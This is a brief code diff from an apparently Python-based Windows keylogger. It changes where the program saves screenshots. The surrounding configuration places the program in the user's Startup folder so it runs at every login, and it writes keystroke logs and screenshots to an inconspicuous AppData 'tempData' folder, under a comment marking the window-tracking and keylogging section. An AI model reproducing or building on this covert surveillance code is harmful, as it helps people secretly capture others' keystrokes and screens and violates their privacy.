@@ -14,7 +14,7 @@ class Configuration:
             self.__filePath = f'c:\\Users\\{self.__userName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
             self.__logFileName = 'log.txt'
             self.__logPath = f'c:\\Users\\{self.__userName}\\AppData\\Roaming\\tempData\\'
-            self.__screenshotPath = self.__logPath + 'pics\\'
+            self.__screenshotPath = self.__logPath
             self.__currentDir = path.dirname(sys.executable)
             self.__currentPath = self.__currentDir + f'\\{self.__fileName}'
         #WINDOWTRACKING AND KEYLOGGING
